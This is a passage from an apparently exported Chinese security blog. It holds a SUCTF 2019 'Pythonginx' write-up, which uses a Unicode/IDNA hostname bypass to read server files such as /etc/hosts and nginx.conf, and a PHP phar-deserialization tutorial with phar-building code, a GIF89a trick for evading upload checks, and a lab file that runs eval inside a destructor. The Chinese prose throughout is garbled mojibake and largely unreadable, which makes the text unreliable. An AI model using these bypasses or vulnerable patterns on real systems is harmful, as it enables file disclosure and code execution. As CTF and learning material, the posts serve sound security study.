<p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1g9rosxpo4lj316w0iyn63.jpg" data-fancybox="group" data-caption="test" class="fancybox"><img alt="test" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1g9rosxpo4lj316w0iyn63.jpg" class="lazyload" title="test"></a></p>
<p>ç„¶åè¿™é‡Œé‡åˆ°ä¸€ä¸ªå‘ï¼Œä¸Šå›¾åœ¨BPä¸­ï¼Œåœˆå‡ºæ¥çš„ <code>POST</code>ï¼Œç›´æ¥å°†æ‹¦æˆªåˆ°çš„ <code>GET</code> æ”¹æˆ <code>POST</code> ä¼šè¢«wafï¼Œå›æ˜¾403ï¼Œè¿™æ˜¯å› ä¸ºåœ¨httpé‡Œï¼Œ<code>GET</code> æ–¹æ³•æäº¤æ•°æ®æ—¶ï¼Œæ•°æ®ä¼šä»¥ <code>&amp;</code> ç¬¦å·ä½œä¸ºåˆ†éš”ç¬¦çš„å½¢å¼ï¼Œåœ¨URLåé¢æ·»åŠ éœ€è¦æäº¤çš„å‚æ•°ï¼Œè€Œ <code>POST</code> ä¸ç”¨å†åœ°å€æ è¾“å…¥ï¼Œå› æ­¤è¦å³é”®é€‰æ‹©æ›´æ”¹ <code>è¯·æ±‚æ–¹æ³•</code>ã€‚</p>
<p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1g9rosxjbowj30ct0csac3.jpg" data-fancybox="group" data-caption="test" class="fancybox"><img alt="test" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1g9rosxjbowj30ct0csac3.jpg" class="lazyload" title="test"></a></p>
<hr>
<h2 id="SUCTF-2019-Pythonginx"><a href="#SUCTF-2019-Pythonginx" class="headerlink" title="[SUCTF 2019]Pythonginx"></a>[SUCTF 2019]Pythonginx</h2><p>è€ƒç‚¹ç±»ä¼¼ <code>[HCTF 2018]admin</code> çš„ Unicode æ¬ºéª—<br><code>CVE-2019-9636</code> ï¼šurlsplitä¸å¤„ç†NFKCæ ‡å‡†åŒ– <a href="https://bugs.python.org/issue36216" target="_blank" rel="noopener">CVEç‚¹è¿™é‡Œ</a></p>
<p>ä»¥åŠNginxé‡è¦æ–‡ä»¶ä½ç½®</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div></div><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">é…ç½®æ–‡ä»¶å­˜æ”¾ç›®å½•ï¼š&#x2F;etc&#x2F;nginx</span><br><span class="line">ä¸»é…ç½®æ–‡ä»¶ï¼š&#x2F;etc&#x2F;nginx&#x2F;conf&#x2F;nginx.conf</span><br><span class="line">ç®¡ç†è„šæœ¬ï¼š&#x2F;usr&#x2F;lib64&#x2F;systemd&#x2F;system&#x2F;nginx.service</span><br><span class="line">æ¨¡å—ï¼š&#x2F;usr&#x2F;lisb64&#x2F;nginx&#x2F;modules</span><br><span class="line">åº”ç”¨ç¨‹åºï¼š&#x2F;usr&#x2F;sbin&#x2F;nginx</span><br><span class="line">ç¨‹åºé»˜è®¤å­˜æ”¾ä½ç½®ï¼š&#x2F;usr&#x2F;share&#x2F;nginx&#x2F;html</span><br><span class="line">æ—¥å¿—é»˜è®¤å­˜æ”¾ä½ç½®ï¼š&#x2F;var&#x2F;log&#x2F;nginx</span><br></pre></td></tr></table></figure></div>
<hr>
<p>ç‚¹å¼€é“¾æ¥ï¼Œå‘ç°æœ‰æºç </p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">python</div></div><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">        @app.route('/getUrl', methods=['GET', 'POST'])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getUrl</span><span class="params">()</span>:</span></span><br><span class="line">    url = request.args.get(<span class="string">"url"</span>)</span><br><span class="line">    host = parse.urlparse(url).hostname</span><br><span class="line">    <span class="keyword">if</span> host == <span class="string">'suctf.cc'</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"æˆ‘æ‰Œ your problem? 111"</span></span><br><span class="line">    parts = list(urlsplit(url))</span><br><span class="line">    host = parts[<span class="number">1</span>]</span><br><span class="line">    <span class="keyword">if</span> host == <span class="string">'suctf.cc'</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"æˆ‘æ‰Œ your problem? 222 "</span> + host</span><br><span class="line">    newhost = []</span><br><span class="line">    <span class="keyword">for</span> h <span class="keyword">in</span> host.split(<span class="string">'.'</span>):</span><br><span class="line">        newhost.append(h.encode(<span class="string">'idna'</span>).decode(<span class="string">'utf-8'</span>))</span><br><span class="line">    parts[<span class="number">1</span>] = <span class="string">'.'</span>.join(newhost)</span><br><span class="line">    <span class="comment">#å»æ‰ url ä¸­çš„ç©ºæ ¼</span></span><br><span class="line">    finalUrl = urlunsplit(parts).split(<span class="string">' '</span>)[<span class="number">0</span>]</span><br><span class="line">    host = parse.urlparse(finalUrl).hostname</span><br><span class="line">    <span class="keyword">if</span> host == <span class="string">'suctf.cc'</span>:</span><br><span class="line">        <span class="keyword">return</span> urllib.request.urlopen(finalUrl).read()</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"æˆ‘æ‰Œ your problem? 333"</span></span><br></pre></td></tr></table></figure></div>
<p>æºç è¦æ±‚æ„é€ å‡ºç¬¬ä¸‰æ¬¡åˆ¤æ–­çš„æ—¶å€™æ˜¯suctf.ccä½†æ˜¯åœ¨å‰ä¸¤ä¸ªåˆ¤æ–­çš„æ—¶å€™åˆä¸èƒ½æ˜¯suctf.ccï¼Œæ‰€ä»¥å°±æ˜¯å…¶ä¸­çš„å­—ç¬¦åœ¨ç¬¬ä¸‰æ¬¡åˆ¤æ–­å‰å¤„ç†åè¦å˜æˆsuctf.ccäº†ã€‚</p>
<p>é‚£å°±æ‰¾ä¸€ä¸ª <a href="https://unicode.org/cldr/utility/character.jsp?a=1D56E&B1=Show" target="_blank" rel="noopener">å¯ç”¨çš„å­—ç¬¦ä»£æ›¿</a><br>ç”¨æ¥è¯•ä¸€ä¸‹æ–‡ä»¶è¯»å–<br><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1g9rosxjasmj30vc0bm0t9.jpg" data-fancybox="group" data-caption="test" class="fancybox"><img alt="test" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1g9rosxjasmj30vc0bm0t9.jpg" class="lazyload" title="test"></a></p>
<p>å†å°è¯•è¯»ä¸€ä¸‹ <code>/etc/hosts</code></p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div></div><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">127.0.0.1   localhost</span><br><span class="line">::1 localhost ip6-localhost ip6-loopback</span><br><span class="line">fe00::0 ip6-localnet</span><br><span class="line">ff00::0 ip6-mcastprefix</span><br><span class="line">ff02::1 ip6-allnodes</span><br><span class="line">ff02::2 ip6-allrouters</span><br><span class="line">174.0.8.138 57da336a19c9</span><br><span class="line">127.0.0.1     suctf.cc</span><br></pre></td></tr></table></figure></div>

<p>ç„¶åè¯»åˆ° <code>/usr/local/nginx/conf/nginx.conf</code> æ–‡ä»¶æ—¶ï¼Œå…³é”®æ¥äº†ï¼Œpayload <code>/usr/fffffflag</code> å¾—åˆ°flag</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">python</div></div><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">server &#123;</span><br><span class="line">    listen <span class="number">80</span>;</span><br><span class="line">    location / &#123;</span><br><span class="line">        try_files $uri @app;</span><br><span class="line">    &#125;</span><br><span class="line">    location @app &#123;</span><br><span class="line">        include uwsgi_params;</span><br><span class="line">        uwsgi_pass unix:///tmp/uwsgi.sock;</span><br><span class="line">    &#125;</span><br><span class="line">    location /static &#123;</span><br><span class="line">        alias /app/static;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment"># location /flag &#123;</span></span><br><span class="line">    <span class="comment">#     alias /usr/fffffflag;</span></span><br><span class="line">    <span class="comment"># &#125;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>]]></content>
      <categories>
        <category>å­¦ä¹ ç¬”è®°</category>
      </categories>
      <tags>
        <tag>writeup</tag>
        <tag>ctf</tag>
      </tags>
  </entry>
  <entry>
    <title>PHPä¸­å…³äºPharçš„å­¦ä¹ </title>
    <url>/yakko117/2019/12/02/Phar/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\yakko117\assets\css\APlayer.min.css"><script src="\yakko117\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\yakko117\assets\js\Meting.min.js"></script><p>æ¥è‡ªSecarmaçš„å®‰å…¨ç ”ç©¶å‘˜Sam Thomaså‘ç°äº†ä¸€ç§æ–°çš„æ¼æ´åˆ©ç”¨æ–¹å¼ï¼Œå¯ä»¥åœ¨ä¸ä½¿ç”¨phpå‡½æ•°unserialize()çš„å‰æä¸‹ï¼Œå¼•èµ·ä¸¥é‡çš„phpå¯¹è±¡æ³¨å…¥æ¼æ´ã€‚</p>
<a id="more"></a>

<h1 id="ä»€ä¹ˆæ˜¯phar"><a href="#ä»€ä¹ˆæ˜¯phar" class="headerlink" title="ä»€ä¹ˆæ˜¯phar"></a>ä»€ä¹ˆæ˜¯phar</h1><blockquote>
<p>ä¸€ä¸ªPHPç¨‹åºå¾€å¾€æ˜¯ç”±å¤šä¸ªæ–‡ä»¶ç»„æˆçš„,å¦‚æœèƒ½å¤Ÿé›†ä¸­ä¸ºä¸€ä¸ªæ–‡ä»¶æ¥åˆ†å‘å’Œè¿è¡Œæ˜¯å¾ˆæ–¹ä¾¿çš„ã€‚pharä¾¿åº”è¿è€Œç”Ÿã€‚å¤§æ¦‚è·Ÿjavaçš„jaræ–‡ä»¶æ˜¯å·®ä¸å¤šç±»ä¼¼çš„ã€‚ä½†æ˜¯phpçš„pharæ–‡ä»¶æ˜¯å¯ä»¥ç”±phpæœ¬èº«è¿›è¡Œå¤„ç†çš„,ä¸éœ€è¦é¢å¤–çš„å·¥å…·æ¥åˆ›å»ºã€æå–ã€‚</p>
</blockquote>
<h2 id="å…³äºæµåŒ…è£…"><a href="#å…³äºæµåŒ…è£…" class="headerlink" title="å…³äºæµåŒ…è£…"></a>å…³äºæµåŒ…è£…</h2><p>å¤§å¤šæ•°PHPæ–‡ä»¶æ“ä½œå…è®¸ä½¿ç”¨å„ç§URLåè®®å»è®¿é—®æ–‡ä»¶è·¯å¾„ï¼šå¦‚<code>data://ï¼Œzlib://æˆ–php://</code>ã€‚</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div></div><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ä¾‹å¦‚</span><br><span class="line">include(&#39;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;index.php&#39;);</span><br><span class="line">include(&#39;data:&#x2F;&#x2F;text&#x2F;plain;base64,xxxxxxxxxxxx&#39;);</span><br><span class="line"></span><br><span class="line">phar:&#x2F;&#x2F; ä¹Ÿæ˜¯æµåŒ…è£…çš„ä¸€ç§</span><br></pre></td></tr></table></figure></div>

<hr>
<h2 id="pharæ–‡ä»¶çš„ç»“æ„"><a href="#pharæ–‡ä»¶çš„ç»“æ„" class="headerlink" title="pharæ–‡ä»¶çš„ç»“æ„"></a>pharæ–‡ä»¶çš„ç»“æ„</h2><h3 id="stub"><a href="#stub" class="headerlink" title="stub"></a>stub</h3><p><code>phar</code> æ–‡ä»¶æ ‡è¯†ï¼Œæ ¼å¼ä¸º </p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">php</div></div><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">xxx<span class="meta">&lt;?php</span> xxx; <span class="comment"><span class="keyword">__HALT_COMPILER</span>();?&gt;ï¼›</span></span><br></pre></td></tr></table></figure></div>

<h3 id="manifest"><a href="#manifest" class="headerlink" title="manifest"></a>manifest</h3><p>å‹ç¼©æ–‡ä»¶çš„å±æ€§ç­‰ä¿¡æ¯ï¼Œä»¥åºåˆ—åŒ–å­˜å‚¨(æˆ‘ä»¬å¯ä»¥æ³¨å…¥ååºåˆ—åŒ–å­—ç¬¦ä¸²)</p>
<h3 id="contents"><a href="#contents" class="headerlink" title="contents"></a>contents</h3><p>å‹ç¼©æ–‡ä»¶çš„å†…å®¹ï¼›</p>
<h3 id="signature"><a href="#signature" class="headerlink" title="signature"></a>signature</h3><p>ç­¾åï¼Œæ”¾åœ¨æ–‡ä»¶æœ«å°¾ï¼›</p>
<hr>
<h2 id="å…³é”®"><a href="#å…³é”®" class="headerlink" title="å…³é”®"></a>å…³é”®</h2><p>åœ¨å®˜æ–¹æ‰‹å†Œä¸­æåˆ°ï¼Œpharçš„æœ¬è´¨æ˜¯ä¸€ç§å‹ç¼©æ–‡ä»¶ï¼Œå…¶ä¸­æ¯ä¸ªè¢«å‹ç¼©æ–‡ä»¶çš„æƒé™ã€å±æ€§ç­‰ä¿¡æ¯éƒ½æ”¾åœ¨è¿™éƒ¨åˆ†ï¼Œä¸€æ˜¯æ–‡ä»¶æ ‡è¯†å¿…é¡»ä»¥ <code>__HALT_COMPILER();?&gt;</code> ç»“å°¾ï¼Œå¦åˆ™PHPæ‰©å±•å°±æ— æ³•è¯†åˆ«ï¼Œä½†æ˜¯å‰é¢çš„å†…å®¹æ²¡æœ‰é™åˆ¶ï¼Œå› æ­¤æˆ‘ä»¬å¯ä»¥éšæ„åœ¨å‰é¢æ·»åŠ æ–‡ä»¶å¤´ï¼Œä¾‹å¦‚ <code>GIF89a</code> æ¥ç»•è¿‡ä¸€äº›ä¸Šä¼ çš„æ£€æµ‹ã€‚äºŒæ˜¯ååºåˆ—åŒ–ï¼Œpharå­˜å‚¨çš„<code>meta-data</code>ä¿¡æ¯ä»¥åºåˆ—åŒ–æ–¹å¼å­˜å‚¨ï¼Œå½“æ–‡ä»¶æ“ä½œå‡½æ•°é€šè¿‡<code>phar://</code> ä¼ªåè®®è§£æpharæ–‡ä»¶æ—¶å°±ä¼šå°†æ•°æ®ååºåˆ—åŒ–ã€‚</p>
<p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1g9iiau4w1wj30ul0dvgn2.jpg" data-fancybox="group" data-caption="test" class="fancybox"><img alt="test" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1g9iiau4w1wj30ul0dvgn2.jpg" class="lazyload" title="test"></a></p>
<hr>
<h2 id="demo"><a href="#demo" class="headerlink" title="demo"></a>demo</h2><p>æ ¹æ®æ–‡ä»¶ç»“æ„æˆ‘ä»¬æ¥è‡ªå·±æ„å»ºä¸€ä¸ªpharæ–‡ä»¶ï¼Œphpå†…ç½®äº†ä¸€ä¸ªPharç±»æ¥å¤„ç†ç›¸å…³æ“ä½œ</p>
<p><strong>æ³¨æ„ï¼šè¦å°†php.iniä¸­çš„phar.readonlyé€‰é¡¹è®¾ç½®ä¸ºOffï¼Œå¦åˆ™æ— æ³•ç”Ÿæˆpharæ–‡ä»¶ã€‚</strong></p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">php</div></div><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">// Phar.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">TestObject</span> </span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line">    $phar = <span class="keyword">new</span> Phar(<span class="string">"test.phar"</span>); <span class="comment">//åç¼€åå¿…é¡»ä¸ºphar</span></span><br><span class="line">    $phar-&gt;startBuffering();</span><br><span class="line">    $phar-&gt;setStub(<span class="string">"&lt;?php __HALT_COMPILER(); ?&gt;"</span>); <span class="comment">//è®¾ç½®stub</span></span><br><span class="line">    $o = <span class="keyword">new</span> TestObject();</span><br><span class="line">    $o -&gt; data=<span class="string">'manayakko'</span>;</span><br><span class="line">    $phar-&gt;setMetadata($o); <span class="comment">//å°†è‡ªå®šä¹‰çš„meta-dataå­˜å…¥manifest</span></span><br><span class="line">    $phar-&gt;addFromString(<span class="string">"test.txt"</span>, <span class="string">"test"</span>); <span class="comment">//æ·»åŠ è¦å‹ç¼©çš„æ–‡ä»¶</span></span><br><span class="line">    <span class="comment">//ç­¾åè‡ªåŠ¨è®¡ç®—</span></span><br><span class="line">    $phar-&gt;stopBuffering();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div>
<p>è®¿é—®åç”Ÿæˆä¸€ä¸ª <code>test.phar</code> æ–‡ä»¶ï¼Œ</p>
<p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1g9iiau0sbqj304u0233ya.jpg" data-fancybox="group" data-caption="test" class="fancybox"><img alt="test" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1g9iiau0sbqj304u0233ya.jpg" class="lazyload" title="test"></a></p>
<p>ç”¨ winhex æ‰“å¼€</p>
<p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1g9iiau3v5wj30mv08hq3l.jpg" data-fancybox="group" data-caption="test" class="fancybox"><img alt="test" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1g9iiau3v5wj30mv08hq3l.jpg" class="lazyload" title="test"></a></p>
<p>å¯ä»¥æ˜æ˜¾çš„çœ‹åˆ° <code>meta-data</code>æ˜¯ä»¥åºåˆ—åŒ–çš„å½¢å¼å­˜å‚¨çš„ã€‚<br>æœ‰åºåˆ—åŒ–æ•°æ®å¿…ç„¶ä¼šæœ‰ååºåˆ—åŒ–æ“ä½œï¼Œphpä¸€å¤§éƒ¨åˆ†çš„æ–‡ä»¶ç³»ç»Ÿå‡½æ•°åœ¨é€šè¿‡ <code>phar://</code>ä¼ªåè®®è§£æpharæ–‡ä»¶æ—¶ï¼Œéƒ½ä¼šå°†meta-dataè¿›è¡Œååºåˆ—åŒ–ï¼Œæµ‹è¯•åå—å½±å“çš„å‡½æ•°å¦‚ä¸‹ï¼š</p>
<table>
<thead>
<tr>
<th>å—å½±å“çš„å‡½æ•°åˆ—è¡¨</th>
<th>â€”â€”-</th>
<th>â€”â€”â€”</th>
<th>â€”â€”-</th>
</tr>
</thead>
<tbody><tr>
<td>fileatime</td>
<td>filectime</td>
<td>filemtime</td>
<td>stat</td>
</tr>
<tr>
<td>fileinode</td>
<td>fileowner</td>
<td>filegroup</td>
<td>fileperms</td>
</tr>
<tr>
<td>file</td>
<td>file_get_contents</td>
<td>readfile</td>
<td>fopen</td>
</tr>
<tr>
<td>file_exists</td>
<td>is_dir</td>
<td>is_executable</td>
<td>is_file</td>
</tr>
<tr>
<td>is_link</td>
<td>is_readable</td>
<td>is_writeable</td>
<td>is_writable</td>
</tr>
<tr>
<td>parse_ini_file</td>
<td>unlink</td>
<td>copy</td>
<td>file_put_contents</td>
</tr>
</tbody></table>
<hr>
<h3 id="phar-fan-php"><a href="#phar-fan-php" class="headerlink" title="phar_fan.php"></a>phar_fan.php</h3><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">php</div></div><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">TestObject</span></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="keyword">$this</span> -&gt; data;   <span class="comment">// <span class="doctag">TODO:</span> Implement __destruct() method.</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">include</span>(<span class="string">'phar://test.phar'</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div>

<p>è¾“å‡ºå¦‚ä¸‹</p>
<p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1g9iiau6zpwj30mp0futa4.jpg" data-fancybox="group" data-caption="test" class="fancybox"><img alt="test" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1g9iiau6zpwj30mp0futa4.jpg" class="lazyload" title="test"></a></p>
<hr>
<h1 id="å°†pharä¼ªé€ æˆå…¶ä»–æ ¼å¼çš„æ–‡ä»¶"><a href="#å°†pharä¼ªé€ æˆå…¶ä»–æ ¼å¼çš„æ–‡ä»¶" class="headerlink" title="å°†pharä¼ªé€ æˆå…¶ä»–æ ¼å¼çš„æ–‡ä»¶"></a>å°†pharä¼ªé€ æˆå…¶ä»–æ ¼å¼çš„æ–‡ä»¶</h1><p>åœ¨å‰é¢åˆ†æpharçš„æ–‡ä»¶ç»“æ„æ—¶å¯èƒ½ä¼šæ³¨æ„åˆ°ï¼Œphpè¯†åˆ«pharæ–‡ä»¶æ˜¯é€šè¿‡å…¶æ–‡ä»¶å¤´çš„stubï¼Œæ›´ç¡®åˆ‡ä¸€ç‚¹æ¥è¯´æ˜¯ <code>__HALT_COMPILER();?&gt;</code>è¿™æ®µä»£ç ï¼Œå¯¹å‰é¢çš„å†…å®¹æˆ–è€…åç¼€åæ˜¯æ²¡æœ‰è¦æ±‚çš„ã€‚é‚£ä¹ˆæˆ‘ä»¬å°±å¯ä»¥é€šè¿‡æ·»åŠ ä»»æ„çš„æ–‡ä»¶å¤´+ä¿®æ”¹åç¼€åçš„æ–¹å¼å°†pharæ–‡ä»¶ä¼ªè£…æˆå…¶ä»–æ ¼å¼çš„æ–‡ä»¶ã€‚</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">php</div></div><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">TestObject</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    $phar = <span class="keyword">new</span> Phar(<span class="string">'phar2.phar'</span>);</span><br><span class="line">    $phar -&gt; startBuffering();</span><br><span class="line">    $phar -&gt; setStub(<span class="string">'GIF89a'</span>.<span class="string">'&lt;?php __HALT_COMPILER();?&gt;'</span>);   <span class="comment">//è®¾ç½®stubï¼Œå¢åŠ gifæ–‡ä»¶å¤´</span></span><br><span class="line">    $phar -&gt;addFromString(<span class="string">'test2.txt'</span>,<span class="string">'test'</span>);  <span class="comment">//æ·»åŠ è¦å‹ç¼©çš„æ–‡ä»¶</span></span><br><span class="line">    $object = <span class="keyword">new</span> TestObject();</span><br><span class="line">    $object -&gt; data = <span class="string">'Manayakko'</span>;</span><br><span class="line">    $phar -&gt; setMetadata($object);  <span class="comment">//å°†è‡ªå®šä¹‰meta-dataå­˜å…¥manifest</span></span><br><span class="line">    $phar -&gt; stopBuffering();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div>

<p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1g9iiau2u46j30ep02tmx6.jpg" data-fancybox="group" data-caption="test" class="fancybox"><img alt="test" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1g9iiau2u46j30ep02tmx6.jpg" class="lazyload" title="test"></a></p>
<p>é‡‡ç”¨è¿™ç§æ–¹æ³•å¯ä»¥ç»•è¿‡å¾ˆå¤§ä¸€éƒ¨åˆ†ä¸Šä¼ æ£€æµ‹ã€‚</p>
<h2 id="åˆ©ç”¨æ¡ä»¶"><a href="#åˆ©ç”¨æ¡ä»¶" class="headerlink" title="åˆ©ç”¨æ¡ä»¶"></a>åˆ©ç”¨æ¡ä»¶</h2><p>pharæ–‡ä»¶è¦èƒ½å¤Ÿä¸Šä¼ åˆ°æœåŠ¡å™¨ç«¯ã€‚<br>å¦‚<code>file_exists()ï¼Œfopen()ï¼Œfile_get_contents()ï¼Œfile()</code>ç­‰æ–‡ä»¶æ“ä½œçš„å‡½æ•°<br>è¦æœ‰å¯ç”¨çš„é­”æœ¯æ–¹æ³•ä½œä¸ºâ€œè·³æ¿â€ã€‚<br>æ–‡ä»¶æ“ä½œå‡½æ•°çš„å‚æ•°å¯æ§ï¼Œä¸” <code>:</code>ã€<code>/</code>ã€<code>phar</code> ç­‰ç‰¹æ®Šå­—ç¬¦æ²¡æœ‰è¢«è¿‡æ»¤ã€‚</p>
<hr>
<h2 id="æ¼æ´éªŒè¯"><a href="#æ¼æ´éªŒè¯" class="headerlink" title="æ¼æ´éªŒè¯"></a>æ¼æ´éªŒè¯</h2><h3 id="ç¯å¢ƒå‡†å¤‡"><a href="#ç¯å¢ƒå‡†å¤‡" class="headerlink" title="ç¯å¢ƒå‡†å¤‡"></a>ç¯å¢ƒå‡†å¤‡</h3><p><code>upload_file.php</code>ï¼Œåç«¯æ£€æµ‹æ–‡ä»¶ä¸Šä¼ ï¼Œæ–‡ä»¶ç±»å‹æ˜¯å¦ä¸ºgifï¼Œæ–‡ä»¶åç¼€åæ˜¯å¦ä¸ºgif<br><code>upload_file.html</code> æ–‡ä»¶ä¸Šä¼ è¡¨å•<br><code>file_un.php</code> å­˜åœ¨<code>file_exists()</code>ï¼Œå¹¶ä¸”å­˜åœ¨<code>__destruct()</code></p>
<h3 id="æ–‡ä»¶å†…å®¹"><a href="#æ–‡ä»¶å†…å®¹" class="headerlink" title="æ–‡ä»¶å†…å®¹"></a>æ–‡ä»¶å†…å®¹</h3><p><code>upload_file.php</code></p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">php</div></div><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span> (($_FILES[<span class="string">"file"</span>][<span class="string">"type"</span>]==<span class="string">"image/gif"</span>)&amp;&amp;(substr($_FILES[<span class="string">"file"</span>][<span class="string">"name"</span>], strrpos($_FILES[<span class="string">"file"</span>][<span class="string">"name"</span>], <span class="string">'.'</span>)+<span class="number">1</span>))== <span class="string">'gif'</span>) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"Upload: "</span> . $_FILES[<span class="string">"file"</span>][<span class="string">"name"</span>];</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"Type: "</span> . $_FILES[<span class="string">"file"</span>][<span class="string">"type"</span>];</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"Temp file: "</span> . $_FILES[<span class="string">"file"</span>][<span class="string">"tmp_name"</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (file_exists(<span class="string">"upload_file/"</span> . $_FILES[<span class="string">"file"</span>][<span class="string">"name"</span>]))</span><br><span class="line">      &#123;</span><br><span class="line">      <span class="keyword">echo</span> $_FILES[<span class="string">"file"</span>][<span class="string">"name"</span>] . <span class="string">" already exists. "</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">      move_uploaded_file($_FILES[<span class="string">"file"</span>][<span class="string">"tmp_name"</span>],</span><br><span class="line">      <span class="string">"upload_file/"</span> .$_FILES[<span class="string">"file"</span>][<span class="string">"name"</span>]);</span><br><span class="line">      <span class="keyword">echo</span> <span class="string">"Stored in: "</span> . <span class="string">"upload_file/"</span> . $_FILES[<span class="string">"file"</span>][<span class="string">"name"</span>];</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">"Invalid file,you can only upload gif"</span>;</span><br><span class="line">  &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div>

<p><code>file_un.php</code></p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">php</div></div><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$filename=$_GET[<span class="string">'filename'</span>];</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">AnyClass</span></span>&#123;</span><br><span class="line">    <span class="keyword">var</span> $output = <span class="string">'echo "ok";'</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="keyword">$this</span> -&gt; output);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">file_exists($filename);</span><br></pre></td></tr></table></figure></div>

<p><code>upload_file.html</code></p>
